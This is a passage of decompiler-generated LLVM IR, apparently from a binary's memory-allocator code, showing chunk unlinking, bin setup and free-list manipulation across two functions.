  store i32 %v2_8052539, i32* @ecx, align 4
  %v1_805253b = icmp eq i32 %v2_8052539, 0
  br i1 %v1_805253b, label %dec_label_pc_8052603, label %dec_label_pc_8052543

dec_label_pc_8052543:                             ; preds = %dec_label_pc_8052535
  store i32 0, i32* %v1_8052539, align 4
  %v0_8052549.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052549

dec_label_pc_8052549:                             ; preds = %dec_label_pc_80525f7, %dec_label_pc_8052543
  %v0_8052566 = phi i32 [ %v3_8052549, %dec_label_pc_80525f7 ], [ %v0_8052549.pre, %dec_label_pc_8052543 ]
  %v1_8052549 = add i32 %v0_8052566, 8
  %v2_8052549 = inttoptr i32 %v1_8052549 to i32*
  %v3_8052549 = load i32, i32* %v2_8052549, align 4
  store i32 %v3_8052549, i32* %edx.global-to-local, align 4
  %v1_8052550 = add i32 %v0_8052566, 4
  %v2_8052550 = inttoptr i32 %v1_8052550 to i32*
  %v3_8052550 = load i32, i32* %v2_8052550, align 4
  store i32 %v3_8052550, i32* %eax.global-to-local, align 4
  %v1_8052555 = and i32 %v3_8052550, -2
  store i32 %v1_8052555, i32* @edi, align 4
  %v2_8052558 = urem i32 %v3_8052550, 2
  %v3_8052558 = icmp eq i32 %v2_8052558, 0
  %v2_805255a = add i32 %v1_8052555, %v0_8052566
  store i32 %v2_805255a, i32* @ebx, align 4
  %v1_805255d = add i32 %v2_805255a, 4
  %v2_805255d = inttoptr i32 %v1_805255d to i32*
  %v3_805255d = load i32, i32* %v2_805255d, align 4
  store i32 %v3_805255d, i32* %edx.global-to-local, align 4
  %v1_8052564 = icmp eq i1 %v3_8052558, false
  br i1 %v1_8052564, label %dec_label_pc_8052586, label %dec_label_pc_8052566

dec_label_pc_8052566:                             ; preds = %dec_label_pc_8052549
  %v1_8052566 = inttoptr i32 %v0_8052566 to i32*
  %v2_8052566 = load i32, i32* %v1_8052566, align 4
  store i32 %v2_8052566, i32* %ebp.global-to-local, align 4
  %v2_805256a = sub i32 %v0_8052566, %v2_8052566
  store i32 %v2_805256a, i32* %eax.global-to-local, align 4
  %v1_805256c = add i32 %v2_805256a, 8
  %v2_805256c = inttoptr i32 %v1_805256c to i32*
  %v3_805256c = load i32, i32* %v2_805256c, align 4
  store i32 %v3_805256c, i32* @esi, align 4
  %v1_805256f = add i32 %v2_805256a, 12
  %v2_805256f = inttoptr i32 %v1_805256f to i32*
  %v3_805256f = load i32, i32* %v2_805256f, align 4
  store i32 %v3_805256f, i32* %edx.global-to-local, align 4
  %v1_8052572 = add i32 %v3_805256c, 12
  %v2_8052572 = inttoptr i32 %v1_8052572 to i32*
  %v3_8052572 = load i32, i32* %v2_8052572, align 4
  store i32 %v3_8052572, i32* @ecx, align 4
  %v12_8052575 = icmp eq i32 %v3_8052572, %v2_805256a
  %v1_8052577 = icmp eq i1 %v12_8052575, false
  br i1 %v1_8052577, label %dec_label_pc_80525b6, label %dec_label_pc_8052579

dec_label_pc_8052579:                             ; preds = %dec_label_pc_8052566
  %v1_8052579 = add i32 %v3_805256f, 8
  %v2_8052579 = inttoptr i32 %v1_8052579 to i32*
  %v3_8052579 = load i32, i32* %v2_8052579, align 4
  %v15_8052579 = icmp eq i32 %v3_8052579, %v3_8052572
  %v1_805257c = icmp eq i1 %v15_8052579, false
  br i1 %v1_805257c, label %dec_label_pc_80525b6, label %dec_label_pc_805257e

dec_label_pc_805257e:                             ; preds = %dec_label_pc_8052579
  %v2_805257e = add i32 %v2_8052566, %v1_8052555
  store i32 %v2_805257e, i32* @edi, align 4
  store i32 %v3_805256f, i32* %v2_8052572, align 4
  %v0_8052583 = load i32, i32* @esi, align 4
  %v1_8052583 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052583 = add i32 %v1_8052583, 8
  %v3_8052583 = inttoptr i32 %v2_8052583 to i32*
  store i32 %v0_8052583, i32* %v3_8052583, align 4
  %v0_8052591.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052586

dec_label_pc_8052586:                             ; preds = %dec_label_pc_8052549, %dec_label_pc_805257e
  %v1_805259a = phi i32 [ %v2_805255a, %dec_label_pc_8052549 ], [ %v0_8052591.pre, %dec_label_pc_805257e ]
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_805258e = and i32 %v3_805255d, -4
  store i32 %v1_805258e, i32* %ebp.global-to-local, align 4
  %v4_8052591 = load i32, i32* %v3_80525f4, align 4
  %v15_8052591 = icmp eq i32 %v1_805259a, %v4_8052591
  br i1 %v15_8052591, label %dec_label_pc_80525e7, label %dec_label_pc_8052596

dec_label_pc_8052596:                             ; preds = %dec_label_pc_8052586
  %v2_8052596 = add i32 %v1_805259a, 4
  %v3_8052596 = add i32 %v2_8052596, %v1_805258e
  %v4_8052596 = inttoptr i32 %v3_8052596 to i32*
  %v5_8052596 = load i32, i32* %v4_8052596, align 4
  store i32 %v5_8052596, i32* %eax.global-to-local, align 4
  %v3_805259a = inttoptr i32 %v2_8052596 to i32*
  store i32 %v1_805258e, i32* %v3_805259a, align 4
  %v0_805259d = load i32, i32* %eax.global-to-local, align 4
  %v1_805259d = urem i32 %v0_805259d, 2
  %v2_805259d = icmp eq i32 %v1_805259d, 0
  store i32 %v1_805259d, i32* %eax.global-to-local, align 4
  %v1_80525a2 = icmp eq i1 %v2_805259d, false
  br i1 %v1_80525a2, label %dec_label_pc_80525c3, label %dec_label_pc_80525a4

dec_label_pc_80525a4:                             ; preds = %dec_label_pc_8052596
  %v0_80525a4 = load i32, i32* @ebx, align 4
  %v1_80525a4 = add i32 %v0_80525a4, 8
  %v2_80525a4 = inttoptr i32 %v1_80525a4 to i32*
  %v3_80525a4 = load i32, i32* %v2_80525a4, align 4
  store i32 %v3_80525a4, i32* @edx, align 4
  %v1_80525a7 = add i32 %v0_80525a4, 12
  %v2_80525a7 = inttoptr i32 %v1_80525a7 to i32*
  %v3_80525a7 = load i32, i32* %v2_80525a7, align 4
  store i32 %v3_80525a7, i32* %eax.global-to-local, align 4
  %v1_80525aa = add i32 %v3_80525a4, 12
  %v2_80525aa = inttoptr i32 %v1_80525aa to i32*
  %v3_80525aa = load i32, i32* %v2_80525aa, align 4
  store i32 %v3_80525aa, i32* @esi, align 4
  %v12_80525ad = icmp eq i32 %v3_80525aa, %v0_80525a4
  %v1_80525af = icmp eq i1 %v12_80525ad, false
  br i1 %v1_80525af, label %dec_label_pc_80525b6, label %dec_label_pc_80525b1

dec_label_pc_80525b1:                             ; preds = %dec_label_pc_80525a4
  %v1_80525b1 = add i32 %v3_80525a7, 8
  %v2_80525b1 = inttoptr i32 %v1_80525b1 to i32*
  %v3_80525b1 = load i32, i32* %v2_80525b1, align 4
  %v15_80525b1 = icmp eq i32 %v3_80525b1, %v3_80525aa
  br i1 %v15_80525b1, label %dec_label_pc_80525bb, label %dec_label_pc_80525b6

dec_label_pc_80525b6:                             ; preds = %dec_label_pc_80525b1, %dec_label_pc_80525a4, %dec_label_pc_8052579, %dec_label_pc_8052566
  %v0_80525b6 = call i32 @function_805282f()
  store i32 %v0_80525b6, i32* %eax.global-to-local, align 4
  %v1_80525bd.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80525bb

dec_label_pc_80525bb:                             ; preds = %dec_label_pc_80525b1, %dec_label_pc_80525b6
  %v1_80525bd = phi i32 [ %v3_80525a4, %dec_label_pc_80525b1 ], [ %v1_80525bd.pre, %dec_label_pc_80525b6 ]
  %v0_80525bd = phi i32 [ %v3_80525a7, %dec_label_pc_80525b1 ], [ %v0_80525b6, %dec_label_pc_80525b6 ]
  %v0_80525bb = load i32, i32* @edi, align 4
  %v1_80525bb = load i32, i32* %ebp.global-to-local, align 4
  %v2_80525bb = add i32 %v1_80525bb, %v0_80525bb
  store i32 %v2_80525bb, i32* @edi, align 4
  %v2_80525bd = add i32 %v1_80525bd, 12
  %v3_80525bd = inttoptr i32 %v2_80525bd to i32*
  store i32 %v0_80525bd, i32* %v3_80525bd, align 4
  %v0_80525c0 = load i32, i32* @edx, align 4
  %v1_80525c0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80525c0 = add i32 %v1_80525c0, 8
  %v3_80525c0 = inttoptr i32 %v2_80525c0 to i32*
  store i32 %v0_80525c0, i32* %v3_80525c0, align 4
  br label %dec_label_pc_80525c3

dec_label_pc_80525c3:                             ; preds = %dec_label_pc_8052596, %dec_label_pc_80525bb
  store i32 %v1_805250e, i32* %eax.global-to-local, align 4
  %v3_80525c7 = load i32, i32* %v2_80525c7, align 4
  store i32 %v3_80525c7, i32* @edx, align 4
  %v0_80525ca = load i32, i32* @ecx, align 4
  store i32 %v0_80525ca, i32* %v2_80525c7, align 4
  %v0_80525cd = load i32, i32* @edi, align 4
  %v1_80525cf = or i32 %v0_80525cd, 1
  store i32 %v1_80525cf, i32* %eax.global-to-local, align 4
  %v0_80525d2 = load i32, i32* @ecx, align 4
  %v1_80525d2 = load i32, i32* @edx, align 4
  %v2_80525d2 = add i32 %v1_80525d2, 12
  %v3_80525d2 = inttoptr i32 %v2_80525d2 to i32*
  store i32 %v0_80525d2, i32* %v3_80525d2, align 4
  %v0_80525d5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80525d5 = load i32, i32* @ecx, align 4
  %v2_80525d5 = add i32 %v1_80525d5, 4
  %v3_80525d5 = inttoptr i32 %v2_80525d5 to i32*
  store i32 %v0_80525d5, i32* %v3_80525d5, align 4
  store i32 %v1_805250e, i32* %eax.global-to-local, align 4
  %v0_80525dc = load i32, i32* @edx, align 4
  %v1_80525dc = load i32, i32* @ecx, align 4
  %v2_80525dc = add i32 %v1_80525dc, 8
  %v3_80525dc = inttoptr i32 %v2_80525dc to i32*
  store i32 %v0_80525dc, i32* %v3_80525dc, align 4
  %v0_80525df = load i32, i32* %eax.global-to-local, align 4
  %v1_80525df = load i32, i32* @ecx, align 4
  %v2_80525df = add i32 %v1_80525df, 12
  %v3_80525df = inttoptr i32 %v2_80525df to i32*
  store i32 %v0_80525df, i32* %v3_80525df, align 4
  %v0_80525e2 = load i32, i32* @edi, align 4
  %v1_80525e2 = load i32, i32* @ecx, align 4
  %v3_80525e2 = add i32 %v1_80525e2, %v0_80525e2
  %v4_80525e2 = inttoptr i32 %v3_80525e2 to i32*
  store i32 %v0_80525e2, i32* %v4_80525e2, align 4
  br label %dec_label_pc_80525f7

dec_label_pc_80525e7:                             ; preds = %dec_label_pc_8052586
  %v0_80525e7 = load i32, i32* @edi, align 4
  %v2_80525e7 = add i32 %v0_80525e7, %v1_805258e
  %v1_80525ea = or i32 %v2_80525e7, 1
  store i32 %v1_80525ea, i32* %eax.global-to-local, align 4
  %v1_80525ed = load i32, i32* @ecx, align 4
  %v2_80525ed = add i32 %v1_80525ed, 4
  %v3_80525ed = inttoptr i32 %v2_80525ed to i32*
  store i32 %v1_80525ea, i32* %v3_80525ed, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v0_80525f4 = load i32, i32* @ecx, align 4
  store i32 %v0_80525f4, i32* %v3_80525f4, align 4
  br label %dec_label_pc_80525f7

dec_label_pc_80525f7:                             ; preds = %dec_label_pc_80525c3, %dec_label_pc_80525e7
  store i32 %v3_8052549, i32* @ecx, align 4
  %v1_80525fb = icmp eq i32 %v3_8052549, 0
  %v1_80525fd = icmp eq i1 %v1_80525fb, false
  br i1 %v1_80525fd, label %dec_label_pc_8052549, label %dec_label_pc_8052603

dec_label_pc_8052603:                             ; preds = %dec_label_pc_80525f7, %dec_label_pc_8052535
  %v15_8052607 = icmp eq i32 %v0_8052543, %v4_805252d
  %v4_805260d = add i32 %v0_8052543, 4
  br i1 %v15_8052607, label %dec_label_pc_805268b, label %dec_label_pc_8052535

dec_label_pc_8052617:                             ; preds = %dec_label_pc_8052617.lr.ph, %dec_label_pc_8052617
  %v1_805261b = phi i32 [ 1, %dec_label_pc_8052617.lr.ph ], [ %v0_8052626, %dec_label_pc_8052617 ]
  %v2_805261b = mul i32 %v1_805261b, 8
  %v4_805261b = add i32 %v3_805261b, %v2_805261b
  store i32 %v4_805261b, i32* %eax.global-to-local, align 4
  %v1_805261f = add i32 %v1_805261b, 1
  store i32 %v1_805261f, i32* %edx.global-to-local, align 4
  %v2_8052620 = add i32 %v4_805261b, 12
  %v3_8052620 = inttoptr i32 %v2_8052620 to i32*
  store i32 %v4_805261b, i32* %v3_8052620, align 4
  %v0_8052623 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052623 = add i32 %v0_8052623, 8
  %v3_8052623 = inttoptr i32 %v2_8052623 to i32*
  store i32 %v0_8052623, i32* %v3_8052623, align 4
  %v0_8052626 = load i32, i32* %edx.global-to-local, align 4
  %v7_8052629 = icmp sgt i32 %v0_8052626, 95
  br i1 %v7_8052629, label %dec_label_pc_805262b, label %dec_label_pc_8052617

dec_label_pc_805262b:                             ; preds = %dec_label_pc_8052617
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_805262f = add i32 %tmp20, 864
  %v2_805262f = inttoptr i32 %v1_805262f to i32*
  %v3_805262f = load i32, i32* %v2_805262f, align 4
  %v4_805262f = or i32 %v3_805262f, 1
  store i32 %v4_805262f, i32* %v2_805262f, align 4
  %v0_8052636 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052636 = add i32 %v0_8052636, 840
  %v2_8052636 = inttoptr i32 %v1_8052636 to i32*
  store i32 0, i32* %v2_8052636, align 4
  %v0_8052640 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052640 = add i32 %v0_8052640, 852
  %v2_8052640 = inttoptr i32 %v1_8052640 to i32*
  store i32 65536, i32* %v2_8052640, align 4
  %v0_805264a = load i32, i32* %eax.global-to-local, align 4
  %v1_805264a = add i32 %v0_805264a, 844
  %v2_805264a = inttoptr i32 %v1_805264a to i32*
  store i32 262144, i32* %v2_805264a, align 4
  %v0_8052654 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052654 = add i32 %v0_8052654, 836
  %v2_8052654 = inttoptr i32 %v1_8052654 to i32*
  store i32 262144, i32* %v2_8052654, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v2_8052665 = load i32, i32* %arg1, align 4
  %v1_8052667 = urem i32 %v2_8052665, 4
  %v1_805266a = or i32 %v1_8052667, 72
  store i32 %v1_805266a, i32* %arg1, align 4
  %v0_805266f = load i32, i32* @edx, align 4
  %v1_8052671 = add i32 %v0_805266f, 52
  store i32 %v1_8052671, i32* %eax.global-to-local, align 4
  %v2_8052674 = add i32 %v0_805266f, 44
  %v3_8052674 = inttoptr i32 %v2_8052674 to i32*
  store i32 %v1_8052671, i32* %v3_8052674, align 4
  %v1_8052679 = call i32 @function_8052c73(i32 30)
  store i32 %v1_8052679, i32* %eax.global-to-local, align 4
  %v2_8052685 = add i32 %tmp20, 860
  %v3_8052685 = inttoptr i32 %v2_8052685 to i32*
  store i32 %v1_8052679, i32* %v3_8052685, align 4
  br label %dec_label_pc_805268b

dec_label_pc_805268b:                             ; preds = %dec_label_pc_8052603, %dec_label_pc_805262b
  store i32 %v0_80524ee, i32* @ebx, align 4
  store i32 %v0_80524ed, i32* @esi, align 4
  store i32 %v0_80524ec, i32* @edi, align 4
  %v0_8052692 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8052692

; uselistorder directives
  uselistorder i32 %v0_8052626, { 1, 0 }
  uselistorder i32 %v0_8052623, { 1, 0 }
  uselistorder i32 %v1_805261b, { 1, 0 }
  uselistorder i32 %v0_80525e2, { 1, 0 }
  uselistorder i32 %v1_805259d, { 1, 0 }
  uselistorder i32 %v2_8052596, { 1, 0 }
  uselistorder i32 %v1_805258e, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805259a, { 1, 0 }
  uselistorder i32 %v3_8052549, { 2, 1, 3, 0 }
  uselistorder i32 %v0_8052566, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8052543, { 1, 0, 3, 2 }
  uselistorder i32* %v3_80525f4, { 1, 0 }
  uselistorder i32 %v1_805250e, { 1, 0 }
  uselistorder i32 %tmp20, { 3, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder i32 -3, { 1, 0 }
  uselistorder label %dec_label_pc_805268b, { 1, 0 }
  uselistorder label %dec_label_pc_8052617, { 1, 0 }
  uselistorder label %dec_label_pc_80525f7, { 1, 0 }
  uselistorder label %dec_label_pc_80525c3, { 1, 0 }
  uselistorder label %dec_label_pc_80525bb, { 1, 0 }
  uselistorder label %dec_label_pc_8052586, { 1, 0 }
}

define i32 @function_8052693(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052693:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8052693 = load i32, i32* @ebp, align 4
  %v0_8052694 = load i32, i32* @edi, align 4
  %v0_8052695 = load i32, i32* @esi, align 4
  %v0_8052696 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_805269e = icmp eq i32 %arg1, 0
  br i1 %v1_805269e, label %dec_label_pc_8052827, label %dec_label_pc_80526a6

dec_label_pc_80526a6:                             ; preds = %dec_label_pc_8052693
  %v2_80526b1 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80526b1, i32* @eax, align 4
  %v2_80526b6 = call i32 @function_8052dfa(i32 %v2_80526b1, i32 134557175)
  store i32 %v2_80526b6, i32* %eax.global-to-local, align 4
  %v1_80526c2 = call i32 @function_8052df7(i32 ptrtoint (i32* @global_var_805503c.31 to i32))
  %v1_80526c7 = add i32 %arg1, -8
  store i32 %v1_80526c7, i32* @ecx, align 4
  %v0_80526ca = load i8, i8* @global_var_8055320.32, align 1
  %v1_80526ca = sext i8 %v0_80526ca to i32
  store i32 %v1_80526ca, i32* %eax.global-to-local, align 4
  %v1_80526d2 = add i32 %arg1, -4
  %v2_80526d2 = inttoptr i32 %v1_80526d2 to i32*
  %v3_80526d2 = load i32, i32* %v2_80526d2, align 4
  %v1_80526d7 = and i32 %v3_80526d2, -4
  %v4_80526d7 = trunc i32 %v1_80526d7 to i8
  store i32 %v1_80526d7, i32* @ebx, align 4
  %v8_80526dc = icmp ugt i8 %v4_80526d7, %v0_80526ca
  br i1 %v8_80526dc, label %dec_label_pc_80526fe, label %dec_label_pc_80526de

dec_label_pc_80526de:                             ; preds = %dec_label_pc_80526a6
  %v2_80526de = udiv i32 %v3_80526d2, 8
  %v1_80526e1 = or i32 %v1_80526ca, 3
  %v3_80526e1 = trunc i32 %v1_80526e1 to i8
  store i32 %v1_80526e1, i32* %eax.global-to-local, align 4
  store i8 %v3_80526e1, i8* @global_var_8055320.32, align 32
  %v1_80526e9 = mul nuw i32 %v2_80526de, 4
  %v2_80526e9 = add i32 %v1_80526e9, ptrtoint (i8* @global_var_8055320.32 to i32)
  store i32 %v2_80526e9, i32* @edx, align 4
  %v1_80526f0 = add i32 %v1_80526e9, add (i32 ptrtoint (i8* @global_var_8055320.32 to i32), i32 -4)
  %v2_80526f0 = inttoptr i32 %v1_80526f0 to i32*
  %v3_80526f0 = load i32, i32* %v2_80526f0, align 4
  store i32 %v3_80526f0, i32* %eax.global-to-local, align 4
  %v3_80526f3 = inttoptr i32 %arg1 to i32*
  store i32 %v3_80526f0, i32* %v3_80526f3, align 4
  %v0_80526f6 = load i32, i32* @ecx, align 4
  %v1_80526f6 = load i32, i32* @edx, align 4
  %v2_80526f6 = add i32 %v1_80526f6, -4
  %v3_80526f6 = inttoptr i32 %v2_80526f6 to i32*
  store i32 %v0_80526f6, i32* %v3_80526f6, align 4
  br label %dec_label_pc_8052816

dec_label_pc_80526fe:                             ; preds = %dec_label_pc_80526a6
  %v1_80526fe = trunc i32 %v3_80526d2 to i8
  %v2_80526fe = and i8 %v1_80526fe, 2
  %v3_80526fe = icmp eq i8 %v2_80526fe, 0
  %v5_80526fe = zext i8 %v2_80526fe to i32
  %v7_80526fe = and i32 %v3_80526d2, -256
  %v8_80526fe = or i32 %v5_80526fe, %v7_80526fe
  store i32 %v8_80526fe, i32* @edx, align 4
  %v1_8052701 = icmp eq i1 %v3_80526fe, false
  br i1 %v1_8052701, label %dec_label_pc_80527f6, label %dec_label_pc_8052707

dec_label_pc_8052707:                             ; preds = %dec_label_pc_80526fe
  %v1_8052707 = or i32 %v1_80526ca, 1
  %v3_8052707 = trunc i32 %v1_8052707 to i8
  store i32 %v1_8052707, i32* %eax.global-to-local, align 4
  %v2_805270a = add i32 %v1_80526d7, %v1_80526c7
  store i32 %v2_805270a, i32* @esi, align 4
  store i8 %v3_8052707, i8* @global_var_8055320.32, align 32
  %v1_8052712 = add i32 %v2_805270a, 4
  %v2_8052712 = inttoptr i32 %v1_8052712 to i32*
  %v3_8052712 = load i32, i32* %v2_8052712, align 4
  store i32 %v3_8052712, i32* %eax.global-to-local, align 4
  %v2_8052719 = inttoptr i32 %v1_80526d2 to i8*
  %v3_8052719 = load i8, i8* %v2_8052719, align 1
  %v4_8052719 = urem i8 %v3_8052719, 2
  %v5_8052719 = icmp eq i8 %v4_8052719, 0
  %v1_805271d = icmp eq i1 %v5_8052719, false
  br i1 %v1_805271d, label %dec_label_pc_8052740, label %dec_label_pc_805271f

dec_label_pc_805271f:                             ; preds = %dec_label_pc_8052707
  %v2_805271f = inttoptr i32 %v1_80526c7 to i32*
  %v3_805271f = load i32, i32* %v2_805271f, align 4
  store i32 %v3_805271f, i32* @ebp, align 4
  %v2_8052724 = sub i32 %v1_80526c7, %v3_805271f
  store i32 %v2_8052724, i32* %eax.global-to-local, align 4
  %v1_8052726 = add i32 %v2_8052724, 8
  %v2_8052726 = inttoptr i32 %v1_8052726 to i32*
  %v3_8052726 = load i32, i32* %v2_8052726, align 4
  store i32 %v3_8052726, i32* @edi, align 4
  %v1_8052729 = add i32 %v2_8052724, 12
  %v2_8052729 = inttoptr i32 %v1_8052729 to i32*
  %v3_8052729 = load i32, i32* %v2_8052729, align 4
  store i32 %v3_8052729, i32* @edx, align 4
  %v1_805272c = add i32 %v3_8052726, 12
  %v2_805272c = inttoptr i32 %v1_805272c to i32*
  %v3_805272c = load i32, i32* %v2_805272c, align 4
  store i32 %v3_805272c, i32* @ecx, align 4
  %v12_805272f = icmp eq i32 %v3_805272c, %v2_8052724
  %v1_8052731 = icmp eq i1 %v12_805272f, false
  br i1 %v1_8052731, label %dec_label_pc_805276f, label %dec_label_pc_8052733

dec_label_pc_8052733:                             ; preds = %dec_label_pc_805271f
  %v1_8052733 = add i32 %v3_8052729, 8
  %v2_8052733 = inttoptr i32 %v1_8052733 to i32*
  %v3_8052733 = load i32, i32* %v2_8052733, align 4
  %v15_8052733 = icmp eq i32 %v3_8052733, %v3_805272c
  %v1_8052736 = icmp eq i1 %v15_8052733, false
  br i1 %v1_8052736, label %dec_label_pc_805276f, label %dec_label_pc_8052738

dec_label_pc_8052738:                             ; preds = %dec_label_pc_8052733
  %v2_8052738 = add i32 %v3_805271f, %v1_80526d7
  store i32 %v2_8052738, i32* @ebx, align 4
  store i32 %v3_8052729, i32* %v2_805272c, align 4
  %v0_805273d = load i32, i32* @edi, align 4
  %v1_805273d = load i32, i32* @edx, align 4
  %v2_805273d = add i32 %v1_805273d, 8
  %v3_805273d = inttoptr i32 %v2_805273d to i32*
  store i32 %v0_805273d, i32* %v3_805273d, align 4
  %v0_8052747.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052740

dec_label_pc_8052740:                             ; preds = %dec_label_pc_8052707, %dec_label_pc_8052738
  %v1_8052753 = phi i32 [ %v2_805270a, %dec_label_pc_8052707 ], [ %v0_8052747.pre, %dec_label_pc_8052738 ]
  %v1_8052744 = and i32 %v3_8052712, -4
  store i32 %v1_8052744, i32* @ebp, align 4
  %v1_8052747 = load i32, i32* @global_var_805534c.33, align 4
  %v12_8052747 = icmp eq i32 %v1_8052753, %v1_8052747
  br i1 %v12_8052747, label %dec_label_pc_80527a1, label %dec_label_pc_805274f

dec_label_pc_805274f:                             ; preds = %dec_label_pc_8052740
  %v2_805274f = add i32 %v1_8052753, 4
  %v3_805274f = add i32 %v2_805274f, %v1_8052744
  %v4_805274f = inttoptr i32 %v3_805274f to i32*
  %v5_805274f = load i32, i32* %v4_805274f, align 4
  store i32 %v5_805274f, i32* %eax.global-to-local, align 4
  %v3_8052753 = inttoptr i32 %v2_805274f to i32*
  store i32 %v1_8052744, i32* %v3_8052753, align 4
  %v0_8052756 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052756 = urem i32 %v0_8052756, 2
  %v2_8052756 = icmp eq i32 %v1_8052756, 0
  store i32 %v1_8052756, i32* %eax.global-to-local, align 4
  %v1_805275b = icmp eq i1 %v2_8052756, false
  br i1 %v1_805275b, label %dec_label_pc_805277c, label %dec_label_pc_805275d

dec_label_pc_805275d:                             ; preds = %dec_label_pc_805274f
  %v0_805275d = load i32, i32* @esi, align 4
  %v1_805275d = add i32 %v0_805275d, 8
  %v2_805275d = inttoptr i32 %v1_805275d to i32*
  %v3_805275d = load i32, i32* %v2_805275d, align 4
  store i32 %v3_805275d, i32* @edx, align 4
  %v1_8052760 = add i32 %v0_805275d, 12
  %v2_8052760 = inttoptr i32 %v1_8052760 to i32*
  %v3_8052760 = load i32, i32* %v2_8052760, align 4
  store i32 %v3_8052760, i32* %eax.global-to-local, align 4
  %v1_8052763 = add i32 %v3_805275d, 12
  %v2_8052763 = inttoptr i32 %v1_8052763 to i32*
  %v3_8052763 = load i32, i32* %v2_8052763, align 4
  store i32 %v3_8052763, i32* @edi, align 4
  %v12_8052766 = icmp eq i32 %v3_8052763, %v0_805275d
  %v1_8052768 = icmp eq i1 %v12_8052766, false
  br i1 %v1_8052768, label %dec_label_pc_805276f, label %dec_label_pc_805276a

dec_label_pc_805276a:                             ; preds = %dec_label_pc_805275d
  %v1_805276a = add i32 %v3_8052760, 8
  %v2_805276a = inttoptr i32 %v1_805276a to i32*
  %v3_805276a = load i32, i32* %v2_805276a, align 4
  %v15_805276a = icmp eq i32 %v3_805276a, %v3_8052763
  br i1 %v15_805276a, label %dec_label_pc_8052774, label %dec_label_pc_805276f

dec_label_pc_805276f:                             ; preds = %dec_label_pc_805276a, %dec_label_pc_805275d, %dec_label_pc_8052733, %dec_label_pc_805271f
  %v0_805276f = call i32 @function_805282f()
  store i32 %v0_805276f, i32* %eax.global-to-local, align 4
  %v1_8052774.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052774

dec_label_pc_8052774:                             ; preds = %dec_label_pc_805276a, %dec_label_pc_805276f
  %v1_8052774 = phi i32 [ %v3_805275d, %dec_label_pc_805276a ], [ %v1_8052774.pre, %dec_label_pc_805276f ]
  %v0_8052774 = phi i32 [ %v3_8052760, %dec_label_pc_805276a ], [ %v0_805276f, %dec_label_pc_805276f ]
  %v2_8052774 = add i32 %v1_8052774, 12
  %v3_8052774 = inttoptr i32 %v2_8052774 to i32*
  store i32 %v0_8052774, i32* %v3_8052774, align 4
  %v0_8052777 = load i32, i32* @edx, align 4
  %v1_8052777 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052777 = add i32 %v1_8052777, 8
  %v3_8052777 = inttoptr i32 %v2_8052777 to i32*
  store i32 %v0_8052777, i32* %v3_8052777, align 4
  %v0_805277a = load i32, i32* @ebx, align 4
  %v1_805277a = load i32, i32* @ebp, align 4
  %v2_805277a = add i32 %v1_805277a, %v0_805277a
  store i32 %v2_805277a, i32* @ebx, align 4
  br label %dec_label_pc_805277c

dec_label_pc_805277c:                             ; preds = %dec_label_pc_805274f, %dec_label_pc_8052774
  %v0_805277c = load i32, i32* @global_var_805535c.51, align 4
  store i32 %v0_805277c, i32* %eax.global-to-local, align 4
  %v0_8052781 = load i32, i32* @ecx, align 4
  %v1_8052781 = add i32 %v0_8052781, 12
  %v2_8052781 = inttoptr i32 %v1_8052781 to i32*
  store i32 ptrtoint (i32* @global_var_8055354.35 to i32), i32* %v2_8052781, align 4
  %v0_8052788 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052788 = load i32, i32* @ecx, align 4
  %v2_8052788 = add i32 %v1_8052788, 8
  %v3_8052788 = inttoptr i32 %v2_8052788 to i32*
  store i32 %v0_8052788, i32* %v3_8052788, align 4
  %v0_805278b = load i32, i32* @ebx, align 4
  %v1_805278b = load i32, i32* @ecx, align 4
  %v3_805278b = add i32 %v1_805278b, %v0_805278b
  %v4_805278b = inttoptr i32 %v3_805278b to i32*
  store i32 %v0_805278b, i32* %v4_805278b, align 4
  %v0_805278e = load i32, i32* @ecx, align 4
  %v1_805278e = load i32, i32* %eax.global-to-local, align 4
  %v2_805278e = add i32 %v1_805278e, 12
  %v3_805278e = inttoptr i32 %v2_805278e to i32*
  store i32 %v0_805278e, i32* %v3_805278e, align 4
  %v0_8052791 = load i32, i32* @ebx, align 4
  %v1_8052793 = or i32 %v0_8052791, 1
  store i32 %v1_8052793, i32* %eax.global-to-local, align 4
  %v0_8052796 = load i32, i32* @ecx, align 4
  store i32 %v0_8052796, i32* @global_var_805535c.51, align 4
  %v2_805279c = add i32 %v0_8052796, 4
  %v3_805279c = inttoptr i32 %v2_805279c to i32*
  store i32 %v1_8052793, i32* %v3_805279c, align 4
  br label %dec_label_pc_80527b1

dec_label_pc_80527a1:                             ; preds = %dec_label_pc_8052740
  %v0_80527a1 = load i32, i32* @ebx, align 4
  %v2_80527a1 = add i32 %v0_80527a1, %v1_8052744
  store i32 %v2_80527a1, i32* @ebx, align 4
